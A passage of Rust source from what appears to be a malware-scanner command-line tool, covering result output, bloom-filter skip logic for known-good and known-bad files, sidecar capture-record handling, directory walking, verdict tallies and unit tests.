                filed = policy.filed,
                "capture record analyzed as a sidecar",
            );
            policy
        } else {
            SidecarPolicy {
                shown: true,
                filed: true,
            }
        };
        let shown = sidecar.shown
            && (self.config.format().emits_every_result()
                || result
                    .bloom_mark
                    .is_some_and(BloomMark::forces_terminal_display)
                || self.config.filter().shows(result.classification)
                || findings_match_filter(
                    self.config.filter(),
                    &result.top_findings,
                    &result.embedded_files,
                ));
        let mut written = None;
        if shown {
            self.write_result(|| {
                let bytes = encode_result(&result, self.config)?;
                write_stdout(&bytes)?;
                written = Some(bytes);
                Ok(())
            });
        }
        // Kept only when nothing else is owed for this file (no upload), the
        // scan is settled, and what was written is all of it.
        let complete = self.uploader.is_none() && shown == written.is_some();
        tracing::debug!(
            path = %target.origin.path.display(),
            kept = ?target.kept,
            settled = settled.is_some(),
            complete,
            "whether this scan is kept for replay"
        );
        if let Some((notes, role)) = settled.zip(target.kept).filter(|_| complete) {
            let label = target.origin.path.display().to_string();
            match written.map(String::from_utf8).transpose() {
                Ok(output) => {
                    Replay::new(&result, &label, notes, output, self.config)
                        .store(role, self.config);
                }
                Err(_) => tracing::debug!("scan output is not UTF-8; not kept for replay"),
            }
        }
        // Renewed after the result is printed, so local output never waits on
        // the handoff; the upload itself runs on the uploader's thread. Only
        // successful results are sent — an error envelope has an empty file
        // type, which hopper treats as a delete.
        if sidecar.filed
            && let (Some(uploader), Some(hopper_url)) = (&self.uploader, self.config.hopper())
        {
            renew(
                uploader,
                hopper_url,
                target.origin,
                target.fallback_purl,
                result,
            );
        }
    }

    fn report_error(&self, path: &Path, error: &anyhow::Error) {
        if self.cancel.load(Ordering::Relaxed) {
            // Ctrl-C (or a closed stdout) makes in-flight cleave work return
            // cancellation errors on every worker. That is expected control
            // flow, not a failed file; keep it out of both the log and the tally.
            return;
        }
        let msg = crate::tools::enrich_error(error).unwrap_or_else(|| format!("{error:#}"));
        tracing::error!(path = %path.display(), error = %msg, "analysis failed");
        // A failed file still gets a line on stdout under `--format json`, so a
        // consumer reading the NDJSON sees *that* it failed and why, instead of
        // inferring it from a record that never arrives: an `unavailable`
        // decision, which says nothing about the file, in either JSON format.
        // It does not make the failure anything other than a failure: the tally
        // below still counts it, the process still exits 3, and nothing is
        // handed to hopper.
        if self.config.format().is_json()
            && let Err(error) = write_error_record(path, &msg)
        {
            self.output_failed(&error);
        }
        self.tally.errors.fetch_add(1, Ordering::Relaxed);
    }

    /// A result could not be written. A reader that went away stops the scan:
    /// nothing can be told the remaining verdicts. Any other write error is
    /// logged, and the scan goes on.
    fn output_failed(&self, error: &io::Error) {
        if error.kind() == io::ErrorKind::BrokenPipe {
            if !self.broken_pipe.swap(true, Ordering::Relaxed) {
                self.cancel.store(true, Ordering::Relaxed);
            }
        } else {
            tracing::error!(%error, "could not write a scan result");
        }
    }

    /// End the scan: clear the bar, finish hopper renewals, print the summary.
    ///
    /// # Errors
    /// Stdout closed under the scan before anything was flagged, or Ctrl-C
    /// stopped it: either way it stopped early. An interrupted scan must not read as a clean one — the
    /// files it never reached are in no tally — so it is an
    /// [`io::ErrorKind::Interrupted`] error, after the summary of what it did
    /// finish.
    fn finish(self) -> Result<ScanSummary> {
        if let Some(progress) = &self.progress {
            progress.finish();
        }
        drop(self.uploader);
        // Engine-internal attribution (per-phase thread time, regex store
        // churn) for slow-scan diagnosis: cumulative, so logged once a scan.
        cleave::log_scan_stats();
        crate::bloom_repo::log_gates();
        let summary = self.tally.summary(self.started);
        if self.broken_pipe.load(Ordering::Relaxed) {
            // The reader went away (`atomscan … | head`), so nothing more is
            // printed. A verdict already reached still decides the exit status:
            // under `pipefail` a hostile file must not read as success because
            // the consumer stopped reading.
            if summary.hostile > 0 || summary.suspicious > 0 {
                tracing::info!(
                    hostile = summary.hostile,
                    suspicious = summary.suspicious,
                    "stdout closed; exiting on the verdicts already reached",
                );
                return Ok(summary);
            }
            return Err(io::Error::from(io::ErrorKind::BrokenPipe))
                .context("writing scan results to stdout");
        }
        if self.config.format() == OutputFormat::Terminal {
            crate::output::print_summary(&summary);
        }
        if self.cancel.load(Ordering::Relaxed) {
            tracing::warn!(
                analyzed = summary.total_files,
                errors = summary.errors,
                "scan interrupted before every file was analyzed",
            );
            return Err(io::Error::from(io::ErrorKind::Interrupted))
                .context("scan interrupted before every file was analyzed");
        }
        Ok(summary)
    }
}

/// Static issues remain reviewable when the model grades the artifact benign.
/// Member findings include fetched dependencies, which need not be inherited
/// onto the root file's own findings. This affects display, never the verdict.
fn findings_match_filter(
    filter: DisplayFilter,
    root: &[super::TopFinding],
    members: &super::MemberEvals,
) -> bool {
    root.iter()
        .chain(members.values().flat_map(|member| &member.top_findings))
        .any(|finding| {
            (filter.hostile && finding.crit == cleave::Criticality::Hostile)
                || (filter.suspicious && finding.crit == cleave::Criticality::Suspicious)
        })
}

/// What an attached capture record's result does under `--enable-sidecar`.
/// The record is bookkeeping, not a sample, so a clean one is neither shown
/// nor filed; it is shown when it raises anything — a suspicious or hostile
/// verdict, or a severe static finding — and filed only when hostile.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct SidecarPolicy {
    /// Written to the output.
    shown: bool,
    /// Renewed on hopper as a sample.
    filed: bool,
}

impl SidecarPolicy {
    const fn new(class: Classification, severe_findings: bool) -> Self {
        let hostile = matches!(class, Classification::Hostile);
        Self {
            shown: hostile || matches!(class, Classification::Suspicious) || severe_findings,
            filed: hostile,
        }
    }
}

/// One file of a CLI scan, and what the scan knows about it besides its report.
#[derive(Clone, Copy)]
struct Target<'a> {
    origin: Origin<'a>,
    /// A capture record found by a walk under `--enable-sidecar`; see
    /// [`SidecarPolicy`].
    sidecar: bool,
    /// Set when the bytes are a registry-metadata document standing in for a
    /// package that could not be fetched; see [`super::HopperRoute`].
    fallback_purl: Option<&'a str>,
    /// The role its scan is kept for [`Replay`] under, when it is one
    /// scanned with nothing but its bytes and the config.
    kept: Option<Role>,
    /// Called once what the file follows is fetched (see
    /// `ClassifyRequest::fetched`).
    fetched: Option<&'a (dyn Fn() + Sync)>,
}

impl<'a> Target<'a> {
    const fn new(origin: Origin<'a>) -> Self {
        Self {
            origin,
            sidecar: false,
            fallback_purl: None,
            kept: None,
            fetched: None,
        }
    }
}

/// What classifying under a [`ScanConfig`] needs besides the report: the
/// config, and the model bundle it names.
#[derive(Clone, Copy)]
struct Classifier<'a> {
    config: &'a ScanConfig,
    model: &'a Model,
    shap: Option<&'a ShapImportance>,
    cancel: Option<&'a Arc<AtomicBool>>,
    fetched: Option<&'a (dyn Fn() + Sync)>,
}

impl Classifier<'_> {
    /// Classify `report` the way the config asks: the renders its format
    /// needs, its fetch policy and LLM, and the report kept when JSON output or
    /// a hopper renewal will read it. Always returns a result, benign included;
    /// the caller decides whether to display it. With it, what the fetch phase
    /// left on stderr when the result is settled (see
    /// `ClassifiedReport::settled`).
    fn classify(
        &self,
        report: AnalysisReport,
        origin: Origin<'_>,
        bloom_mark: Option<BloomMark>,
        root_path: &Path,
        root_bytes: Option<bytes::Bytes>,
    ) -> Result<(ScanResult, Option<String>)> {
        let config = self.config;
        let label = origin.path.display().to_string();
        let classified = classify_report(
            report,
            ClassifyRequest {
                root_bytes,
                shap: self.shap,
                cancellation: self.cancel,
                fetched: self.fetched,
                terminal_card: wants_terminal_card(config),
                interpret: config.interpret(),
                fetch: config.fetch_policy(),
                zip_passwords: config.zip_passwords(),
                needs: config.output_needs(),
                root_registry: origin.registry,
                root_fetch: origin.fetch,
                bloom_mark,
                ..ClassifyRequest::new(&label, root_path, self.model)
            },
        )?;

        // Per-file phase timing (CLI path only — serve logs its own per-sample
        // line). total_ms is the post-analysis wall clock; subtract it from the
        // caller's whole-invocation elapsed to get the static cleave/filefacts
        // share, which is measured upstream of here.
        let phase = classified.phase;
        tracing::info!(
            path = %label,
            sha256 = %classified.result.sha256,
            file_type = %classified.result.file_type,
            class = ?classified.result.classification,
            fetch_ms = crate::duration_ms(phase.fetch),
            interpret_ms = crate::duration_ms(phase.interpret),
            render_ms = crate::duration_ms(phase.render),
            total_ms = crate::duration_ms(phase.total),
            "scan phases complete",
        );
        let mut classified = classified;
        let settled = classified.settled.take();
        let result = classified.into_scan_result(label, self.model, config.keeps_report());
        Ok((result, settled))
    }
}

/// Write one result to stdout in the configured format: the one writer for
/// path, package and process scans alike.
///
/// # Errors
/// The write failed; `BrokenPipe` means nobody is reading any more.
pub(crate) fn emit_result(r: &ScanResult, config: &ScanConfig) -> io::Result<()> {
    write_stdout(&encode_result(r, config)?)
}

/// Write `bytes` to stdout whole, under one lock so records cannot mix, and
/// flush: the closing summary goes to stderr, and stdio buffering must not
/// strand a card's last line beneath it.
fn write_stdout(bytes: &[u8]) -> io::Result<()> {
    let mut out = io::stdout().lock();
    out.write_all(bytes)?;
    out.flush()
}

/// One result in the configured format, as the bytes written to stdout.
/// Built before stdout is taken, so one large result does not park every
/// other completed scan behind its encoding.
fn encode_result(r: &ScanResult, config: &ScanConfig) -> io::Result<Vec<u8>> {
    let mut out = Vec::new();
    match config.format() {
        OutputFormat::Json => {
            serde_json::to_writer(
                &mut out,
                &crate::server::decision::V1Decision::scanned(r, &r.path),
            )?;
            out.push(b'\n');
        }
        OutputFormat::JsonFull => {
            out = r.full_body(config.all_members()).ok_or_else(|| {
                io::Error::other("result could not be written in the full JSON format")
            })?;
        }
        // The terminal result card was built in `classify_report`.
        OutputFormat::Terminal => {
            out.extend_from_slice(r.rendered_context.as_bytes());
            if !r.rendered_context.ends_with('\n') {
                out.push(b'\n');
            }
            // A process scan names the processes running the binary.
            if let Some(pids) = &r.pids {
                let line = crate::output::terminal_pids_line(pids, r.deleted == Some(true));
                writeln!(out, "{line}")?;
            }
            // `--extra`: append the full ML diagnostics that explain the grade —
            // which route drove it and the top SHAP features behind it.
            if config.extra() {
                crate::output::write_extra(&mut out, r)?;
            }
        }
        // `--format tiny` prefixes the machine verdict line, never colored.
        OutputFormat::Tiny => write_tiny(&mut out, r)?,
        // `--format interpret` is the LLM payload verbatim — no verdict line.
        OutputFormat::Interpret => out.extend_from_slice(r.rendered_context.as_bytes()),
    }
    Ok(out)
}

/// Write the `unavailable` decision for a file that failed analysis.
fn write_error_record(file_path: &Path, msg: &str) -> io::Result<()> {
    let decision =
        crate::server::decision::V1Decision::failed(&file_path.display().to_string(), msg);
    let mut out = io::stdout().lock();
    serde_json::to_writer(&mut out, &decision)?;
    out.write_all(b"\n")
}

/// Whether text output is the terminal card. The machine formats (`tiny`,
/// `interpret`) print the plain payload view instead.
pub(crate) fn wants_terminal_card(config: &ScanConfig) -> bool {
    !matches!(
        config.format(),
        OutputFormat::Tiny | OutputFormat::Interpret
    )
}

/// Apply a bloom-filter decision before any expensive analysis. Hands a
/// short-circuited artifact's verdict line to `emit` (which owns the output
/// stream and its errors) and returns its benign count (1 for a known-good
/// skip, 0 for fast mode's bloom-only unscanned); `None` to proceed.
fn bloom_gate(
    config: &ScanConfig,
    label: &str,
    decision: BloomDecision,
    emit: impl FnOnce(&str, BloomVerdict),
) -> Option<u32> {
    let fast = config.mode() == Mode::Fast;
    // Known-good/unscanned are benign-tier: print the per-file line only when
    // benign output is requested, so a large directory scan isn't spammed. The
    // aggregate tally always reports them in the summary regardless.
    let show_quiet = config.format().is_json() || config.filter().shows(Classification::Benign);
    tally_bloom(decision, fast && decision == BloomDecision::Unknown, label);
    match decision {
        BloomDecision::Skip => {
            if show_quiet {
                emit(label, BloomVerdict::KnownGood);
            }
            Some(1)
        }
        // Known-bad and conflicted are flags, not short-circuits: they run full
        // analysis in every mode — the scan is the verdict — and the flag rides
        // the normal result inline (see `BloomMark`), so no separate banner is
        // printed here. The caller derives the mark from this same decision.
        // A sighting is the same shape of answer as known-bad — a flag that
        // runs the full analysis — but says somebody else reported it rather
        // than that we measured it. The distinction rides the inline mark.
        // An unreadable filter blesses nothing, so that artifact is analyzed
        // too; `record` has already logged the broken bundle.
        BloomDecision::KnownBad
        | BloomDecision::SightedHostile
        | BloomDecision::SightedSuspicious
        | BloomDecision::Unavailable
        | BloomDecision::Conflicted => None,
        // Unknown is left unscanned only in bloom-only fast mode; otherwise scanned.
        BloomDecision::Unknown => fast.then(|| {
            if show_quiet {
                emit(label, BloomVerdict::Unscanned);
            }
            0
        }),
    }
}

/// Count one bloom decision in the end-of-scan tally (`unscanned`: a
/// fast-mode unknown left unanalyzed), and say so loudly on a conflict.
fn tally_bloom(decision: BloomDecision, unscanned: bool, label: &str) {
    crate::bloom_repo::record(decision, unscanned);
    if decision == BloomDecision::Conflicted {
        // Build-time subtraction removes bad keys from good, so a conflict can
        // only mean filter version skew or a producer bug. The file is
        // scanned regardless; the log says the filters need attention.
        tracing::warn!(
            label,
            "bloom conflict: key is in both the good and the bad filter; scanning"
        );
    }
}

/// The bloom decisions cleave's skip predicate left unanalyzed, by path.
///
/// [`Session::record`] counts a skipped file on the decision that skipped it
/// rather than deciding again: a file touched between the two would otherwise
/// be graded from the target-only report cleave returns for a skip.
#[derive(Clone, Default)]
struct SkippedByBloom(Arc<Mutex<HashMap<PathBuf, BloomDecision>>>);

impl SkippedByBloom {
    fn insert(&self, path: &Path, decision: BloomDecision) {
        self.0
            .lock()
            .unwrap_or_else(PoisonError::into_inner)
            .insert(path.to_path_buf(), decision);
    }

    fn take(&self, path: &Path) -> Option<BloomDecision> {
        self.0
            .lock()
            .unwrap_or_else(PoisonError::into_inner)
            .remove(path)
    }
}

/// The bloom short-circuit for a scan target, honoring the local known-good
/// freshness override: a known-good file created, status-changed, or modified
/// within the last hour ([`KNOWN_GOOD_FRESH`]) is scanned on its own merits
/// rather than skipped on its bloom vouch. Returns the benign count (see [`bloom_gate`]) when the target
/// is short-circuited (counted, not scanned) and `None` when it must be scanned.
pub(crate) fn bloom_gate_fresh(
    config: &ScanConfig,
    path: &Path,
    decision: BloomDecision,
    emit: impl FnOnce(&str, BloomVerdict),
) -> Option<u32> {
    if decision == BloomDecision::Skip
        && file_touched_within(path, KNOWN_GOOD_FRESH, SystemTime::now())
    {
        return None;
    }
    bloom_gate(config, &path.display().to_string(), decision, emit)
}

/// The analysis options for a target the operator named by path, which is the
/// shared options with the bloom skip predicate removed.
///
/// A named target is always analyzed on its own merits — a bless is a bulk
/// shortcut for dependencies and directory walks, and answering one where a
/// scan was asked for answers a different question — so cleave must not
/// short-circuit it into a minimal report. With no predicate, nothing lands
/// in [`SkippedByBloom`], and [`Session::record`] grades it.
fn named_target_opts(opts: &AnalysisOptions) -> AnalysisOptions {
    AnalysisOptions {
        skip_predicate: None,
        ..opts.clone()
    }
}

/// What the bloom filters say of a walked file with content `sha_hex`: the
/// decision, whether the file is fresh, and whether the walk passes it over.
///
/// Known-good is trusted and passed over, unless the file was created,
/// status-changed, or modified within the last hour — a fresh known-good is
/// analyzed on its own merits (recent activity, and a guard against a bloom
/// false positive on a freshly planted file). Every other decision is
/// analyzed, adverse or not: in fast mode an unknown is passed over as well,
/// which is what fast mode means. An unparseable digest is analyzed.
fn bloom_passes_over(
    lookup: &Lookup,
    fast: bool,
    sha_hex: &str,
    path: &Path,
) -> (BloomDecision, bool, bool) {
    let Some(digest) = burton::parse_sha256_hex(sha_hex) else {
        return (BloomDecision::Unknown, false, false);
    };
    let decision = lookup.decide(&burton::Artifact::sha256(&digest));
    if decision.may_skip() {
        let fresh = file_touched_within(path, KNOWN_GOOD_FRESH, SystemTime::now());
        (decision, fresh, !fresh)
    } else {
        (decision, false, fast && decision == BloomDecision::Unknown)
    }
}

/// Build the cleave skip predicate from the active bloom filters: a file whose
/// sha256 is known-good (or, in fast mode, simply unknown) is skipped before
/// analysis, and its decision noted in `skipped` for [`Session::record`].
/// Known-bad and conflicted return `false` so they are still analyzed. `None`
/// when bloom is disabled.
fn bloom_skip_predicate(
    config: &ScanConfig,
    skipped: &SkippedByBloom,
) -> Option<cleave::SkipPredicate> {
    let lookup = config.bloom.clone()?;
    let fast = config.mode() == Mode::Fast;
    let skipped = skipped.clone();
    Some(cleave::SkipPredicate(Arc::new(
        move |sha_hex: &str, path: &Path| {
            let (decision, fresh, skip) = bloom_passes_over(&lookup, fast, sha_hex, path);
            if decision.may_skip() {
                crate::bloom_repo::met(if fresh {
                    Gate::FileFresh
                } else {
                    Gate::FileKnownGood
                });
                tracing::debug!(
                    path = %path.display(),
                    sha256 = sha_hex,
                    fresh,
                    "walked file is known-good by content; analyzed only if fresh"
                );
            } else {
                crate::bloom_repo::met(Gate::FileUnvouched);
            }
            if skip {
                skipped.insert(path, decision);
            }
            skip
        },
    )))
}

/// Enumerate the regular files under `dir` for a directory scan: skip `.git`
/// object stores, keep only regular files, never follow symlinks. This reads no
/// file contents — it is a cheap `readdir` pass whose purpose is to learn the
/// file count (and the list) upfront, so the progress bar has a denominator
/// before analysis begins. The list is handed to [`cleave::scan_paths`], which
/// still applies its program-type and size filters per file, so a few of these
/// may be analyzed away without a verdict (the bar tops out just under 100%,
/// then the summary reports the true total).
///
/// Only a directory named exactly `.git` is skipped: `.github/workflows`,
/// `.gitlab-ci.yml` and `.gitmodules` are where CI supply-chain changes land.
/// Every entry the walk cannot read is logged and counted in `errors`, so an
/// unreadable subtree fails the scan instead of passing as clean.
fn discover_files(dir: &Path, errors: &AtomicU32) -> Vec<PathBuf> {
    walkdir::WalkDir::new(dir)
        .follow_links(false)
        .into_iter()
        .filter_entry(|e| !(e.file_type().is_dir() && e.file_name() == ".git"))
        .filter_map(|entry| match entry {
            Ok(e) => Some(e),
            Err(err) => {
                tracing::error!(
                    path = %err.path().unwrap_or(dir).display(),
                    error = %err,
                    "cannot read directory entry; it was not scanned"
                );
                errors.fetch_add(1, Ordering::Relaxed);
                None
            }
        })
        .filter(|e| e.file_type().is_file())
        .map(walkdir::DirEntry::into_path)
        .collect()
}

/// Whether `path` is a collector's capture record (`<artifact>.forage.json`)
/// sitting beside the artifact it describes.
///
/// Under `--enable-sidecar` a directory walk treats those as bookkeeping
/// (see [`SidecarPolicy`]). They are never skipped: whoever wrote the
/// artifact may have written the record too, and a payload inside it is still
/// analyzed. The name alone proves nothing — a script can hide behind it — so
/// only a small JSON object that states a digest qualifies. Naming one
/// directly on the command line scans it like any file.
fn is_attached_sidecar(path: &Path) -> bool {
    /// Larger than any capture record hopper accepts.
    const MAX_RECORD_BYTES: u64 = 1 << 20;
    let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
        return false;
    };
    let Some(artifact) = name.strip_suffix(".forage.json") else {
        return false;
    };
    if artifact.is_empty()
        || !path.with_file_name(artifact).is_file()
        || std::fs::metadata(path).map_or(true, |m| m.len() > MAX_RECORD_BYTES)
    {
        return false;
    }
    std::fs::read(path)
        .ok()
        .and_then(|bytes| serde_json::from_slice::<serde_json::Value>(&bytes).ok())
        .and_then(|record| {
            record
                .pointer("/artifact/sha256")?
                .as_str()
                .map(|sha| sha.len() == 64 && sha.bytes().all(|b| b.is_ascii_hexdigit()))
        })
        .unwrap_or(false)
}

/// The two distinct detection inventories shown in the banner. Bloom entries
/// are SHA-256/PURL signatures; traits, composites, and YARA are actual rules.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) struct DetectionCounts {
    pub hashes_and_purls: u64,
    pub rules: u64,
}

/// Detection inventory after resource load. `cleave::version_info()` loads (or
/// reuses) shared resources; `hashes_and_purls` comes from the already-loaded
/// Bloom repository.
pub(crate) fn detection_counts_from(hashes_and_purls: u64) -> DetectionCounts {
    let info = cleave::version_info();
    DetectionCounts {
        hashes_and_purls,
        rules: info.trait_count as u64 + info.composite_count as u64 + info.yara_rules as u64,
    }
}

/// Detection inventory already resident in memory for the scan banner. Shared
/// by [`run`], [`run_paths`], and `ps` so every scanner reports the same counts.
pub(crate) fn detection_counts(config: &ScanConfig) -> DetectionCounts {
    let hashes_and_purls = config
        .bloom()
        .map_or(0, crate::bloom_repo::Lookup::rule_count);
    detection_counts_from(hashes_and_purls)
}

/// Aggregate verdict counters shared across the parallel scan workers.
#[derive(Default)]
struct Tally {
    hostile: AtomicU32,
    suspicious: AtomicU32,
    benign: AtomicU32,
    errors: AtomicU32,
    static_flags: AtomicU32,
    flagged_candidates: AtomicU32,
}

impl Tally {
    /// Record one classified file against the matching counter.
    fn count(&self, classification: Classification) {
        let counter = match classification {
            Classification::Hostile => &self.hostile,
            Classification::Suspicious => &self.suspicious,
            Classification::Benign => &self.benign,
        };
        counter.fetch_add(1, Ordering::Relaxed);
    }

    /// Assemble the final [`ScanSummary`]. Every analyzed file lands in exactly
    /// one of the three verdict counters (errors are counted apart), so their
    /// sum is the total file count.
    fn summary(&self, scan_start: Instant) -> ScanSummary {
        let hostile = self.hostile.load(Ordering::Relaxed);
        let suspicious = self.suspicious.load(Ordering::Relaxed);
        let benign = self.benign.load(Ordering::Relaxed);
        let errors = self.errors.load(Ordering::Relaxed);
        ScanSummary {
            // Only files that were actually analyzed count as scanned. Errors
            // (missing paths, read failures) are reported separately so a path
            // that was never opened is never tallied as a clean scan.
            total_files: hostile + suspicious + benign,
            hostile,
            suspicious,
            benign,
            errors,
            dependency_attention: super::DependencyAttention {
                flagged_candidates: self.flagged_candidates.load(Ordering::Relaxed),
            },
            static_flags: self.static_flags.load(Ordering::Relaxed),
            duration_ms: crate::duration_ms(scan_start.elapsed()),
        }
    }
}

/// Whether the file at `path` was created (btime), status-changed (ctime), or
/// modified (mtime) within the last `window` (in whole seconds). A known-good file this
/// fresh is re-scanned rather than trusted on its bloom vouch — recent activity,
/// and a guard against a bloom false-positive on a freshly planted file. A
/// timestamp in the future (clock skew) counts as recent; unreadable metadata
/// (e.g. a fetched artifact's synthetic path) counts as not-recent.
fn file_touched_within(path: &Path, window: Duration, now: SystemTime) -> bool {
    let Ok(md) = std::fs::metadata(path) else {
        return false;
    };
    let recent = |t: SystemTime| {
        now.duration_since(t)
            .map_or(true, |d| d.as_secs() <= window.as_secs())
    };
    // created()/modified() are unsupported on some platforms/filesystems.
    if md.created().is_ok_and(recent) || md.modified().is_ok_and(recent) {
        return true;
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::MetadataExt;
        use std::time::UNIX_EPOCH;
        let ctime = md.ctime();
        if ctime >= 0 && recent(UNIX_EPOCH + Duration::from_secs(ctime.unsigned_abs())) {
            return true;
        }
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Named files and walked files are kept apart, a path that is neither
    /// is an error, and only one named file with nothing else is "alone".
    #[test]
    fn targets_keep_named_and_walked_files_apart() {
        let dir = tempfile::tempdir().expect("tempdir");
        let named = dir.path().join("named.txt");
        std::fs::write(&named, "x").expect("write");
        let walked = dir.path().join("walked");
        std::fs::create_dir_all(walked.join("deep")).expect("mkdir");
        std::fs::write(walked.join("deep/found.txt"), "y").expect("write");
        let absent = dir.path().join("absent");

        let targets = Targets::of(&[named.clone(), walked.clone(), absent]);
        assert_eq!(targets.files, std::slice::from_ref(&named));
        assert_eq!(targets.dir_files, [walked.join("deep/found.txt")]);
        assert_eq!(targets.errors, 1);
        assert!(!targets.alone(), "a directory came with it");

        assert!(Targets::of(std::slice::from_ref(&named)).alone());
        assert!(!Targets::of(&[named.clone(), named]).alone());
        assert!(
            !Targets::of(&[walked]).alone(),
            "one walked file is a batch"
        );
    }

    /// Replaying every file is something only a scan with files can do, and
    /// one file left to analyze is enough to need the rules.
    #[test]
    fn replays_answer_for_all_only_when_no_file_is_left() {
        let hashed = |replay: Option<&str>| {
            Some(Hashed {
                sha256: "ab".repeat(32),
                replay: replay.map(|json| serde_json::from_str(json).expect("a replay")),
            })
        };
        let kept = || {
            hashed(Some(
                r#"{"at":0,"expires":false,"label":"a.bin","class":0,"severe":false,
                    "flagged_candidates":0,"notes":"","output":null}"#,
            ))
        };
        let replays = |files, dir_files| Replays { files, dir_files };
        assert!(!Replays::default().answer_all(), "no file, no answer");
        assert!(replays(vec![kept()], vec![]).answer_all());
        assert!(replays(vec![kept()], vec![kept(), kept()]).answer_all());
        assert!(!replays(vec![kept()], vec![kept(), None]).answer_all());
        assert!(!replays(vec![kept()], vec![hashed(None)]).answer_all());
        assert!(!replays(vec![None], vec![]).answer_all());
    }

    #[test]
    fn discovery_keeps_dot_git_lookalikes_and_skips_only_the_object_store() {
        let dir = tempfile::tempdir().expect("tempdir");
        for name in [
            ".git/config",
            ".github/workflows/ci.yml",
            ".gitlab-ci.yml",
            ".gitmodules",
        ] {
            let path = dir.path().join(name);
            std::fs::create_dir_all(path.parent().expect("parent")).expect("mkdir");
            std::fs::write(&path, "x").expect("write");
        }
        let errors = AtomicU32::new(0);
        let mut found: Vec<PathBuf> = discover_files(dir.path(), &errors)
            .into_iter()
            .map(|p| {
                p.strip_prefix(dir.path())
                    .expect("under root")
                    .to_path_buf()
            })
            .collect();
        found.sort();
        assert_eq!(
            found,
            [".github/workflows/ci.yml", ".gitlab-ci.yml", ".gitmodules"].map(PathBuf::from)
        );
        assert_eq!(errors.load(Ordering::Relaxed), 0);

        // A scan rooted inside `.github` must still find its files.
        let rooted = discover_files(&dir.path().join(".github"), &errors);
        assert_eq!(rooted.len(), 1);
    }

    #[cfg(unix)]
    #[test]
    fn discovery_counts_unreadable_directories_as_errors() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().expect("tempdir");
        let locked = dir.path().join("locked");
        std::fs::create_dir(&locked).expect("mkdir");
        std::fs::write(locked.join("payload.sh"), "x").expect("write");
        std::fs::set_permissions(&locked, std::fs::Permissions::from_mode(0o000)).expect("chmod");
        // Root reads through any mode; there is nothing to prove there.
        let readable = std::fs::read_dir(&locked).is_ok();
        let errors = AtomicU32::new(0);
        let found = discover_files(dir.path(), &errors);
        std::fs::set_permissions(&locked, std::fs::Permissions::from_mode(0o755)).expect("chmod");
        if !readable {
            assert!(found.is_empty());
            assert_eq!(errors.load(Ordering::Relaxed), 1);
        }
    }

    #[test]
    fn static_dependency_findings_survive_benign_verdict_display_filter() {
        let finding = super::super::TopFinding {
            id: "objectives/impact/test::issue".into(),
            crit: cleave::Criticality::Suspicious,
            conf: 0.99,
            desc: "Dependency issue".into(),
        };
        let mut members = super::super::MemberEvals::new();
        members.insert(
            1,
            super::super::EmbeddedFile {
                id: 1,
                sha256: "dep".into(),
                path: "dependency.js".into(),
                file_type: "javascript".into(),
                classification: Classification::Benign,
                probability: 0.01,
                threshold: 0.9,
                level: crate::model::Level::Clean,
                model_scores: vec![],
                skipped_models: vec![],
                formula: String::new(),
                top_findings: vec![finding.clone()],
                floor: None,
            },
        );
        let hostile_only = DisplayFilter {
            hostile: true,
            suspicious: false,
            benign: false,
        };
        assert!(findings_match_filter(
            DisplayFilter::alerts_only(),
            &[],
            &members
        ));
        assert!(!findings_match_filter(hostile_only, &[], &members));
        assert!(findings_match_filter(
            DisplayFilter::alerts_only(),
            &[finding],
            &Default::default()
        ));
        let finding = &mut members.get_mut(&1).unwrap().top_findings[0];
        finding.crit = cleave::Criticality::Notable;
        assert!(!findings_match_filter(
            DisplayFilter::alerts_only(),
            &[],
            &members
        ));
        members.get_mut(&1).unwrap().top_findings[0].crit = cleave::Criticality::Hostile;
        assert!(findings_match_filter(hostile_only, &[], &members));
    }

    /// A file written inside the known-good freshness window is analyzed
    /// whatever vouches for it; one written more than an hour ago is not held
    /// back, and neither is one whose metadata cannot be read.
    #[test]
    fn file_touched_within_flags_fresh_and_ignores_old_and_missing() {
        let dir = tempfile::tempdir().unwrap();
        let f = dir.path().join("x.txt");
        std::fs::write(&f, b"hi").unwrap();
        let now = SystemTime::now();
        assert_eq!(KNOWN_GOOD_FRESH, Duration::from_hours(1));
        // Just-written file is within the window, and still is half an hour on.
        assert!(file_touched_within(&f, KNOWN_GOOD_FRESH, now));
        let soon = now + Duration::from_mins(30);
        assert!(file_touched_within(&f, KNOWN_GOOD_FRESH, soon));
        // Evaluated from a clock two hours ahead, every timestamp is outside
        // the window — the not-recent (skip-eligible) case.
        let later = now + Duration::from_hours(2);
        assert!(!file_touched_within(&f, KNOWN_GOOD_FRESH, later));
        // Unreadable metadata (e.g. a fetched artifact's synthetic path) is treated
        // as not-recent, so the normal known-good skip still applies.
        assert!(!file_touched_within(
            &dir.path().join("does-not-exist"),
            KNOWN_GOOD_FRESH,
            now
        ));
    }

    /// A target the operator named is never handed to cleave with a skip
    /// predicate: the bless is a bulk shortcut for directory walks and fetched
    /// dependencies, and answering "scan this file" from one returns a lookup
    /// where an analysis was asked for. The directory-walk options keep theirs.
    #[test]
    fn named_target_opts_drop_the_skip_predicate_and_keep_everything_else() {
        let walk = cleave::AnalysisOptions {
            slow_rule_ms: 1234,
            skip_predicate: Some(cleave::SkipPredicate(Arc::new(|_, _| true))),
            ..Default::default()
        };
        assert!(
            walk.skip_predicate.is_some(),
            "a directory walk keeps the known-good shortcut"
        );

        let named = named_target_opts(&walk);
        assert!(
            named.skip_predicate.is_none(),
            "a named target must be analyzed on its own merits"
        );
        // Only the predicate moves; everything else the caller configured has to
        // survive, or a named file would be analyzed under different settings
        // than the same file found by walking its parent directory.
        assert_eq!(named.slow_rule_ms, walk.slow_rule_ms);
    }

    /// A directory walk finds every file, capture records included: a record
    /// may carry a payload, so nothing is skipped unanalyzed. Which of them are
    /// sidecars is decided per file, and only under `--enable-sidecar`: a
    /// small JSON record beside the artifact it names. A file merely *named*
    /// like one is an ordinary file.
    #[test]
    fn directory_walk_finds_sidecars_and_tells_them_apart() {
        let dir = tempfile::tempdir().expect("tempdir");
        let record = format!(r#"{{"artifact":{{"sha256":"{}"}}}}"#, "ab".repeat(32));
        for (name, body) in [
            ("evil-1.0.0.tgz", "{}"),
            ("evil-1.0.0.tgz.forage.json", record.as_str()),
            ("orphan.tgz.forage.json", record.as_str()),
            ("notes.json", "{}"),
            ("lib.so", "{}"),
            (
                "lib.so.forage.json",
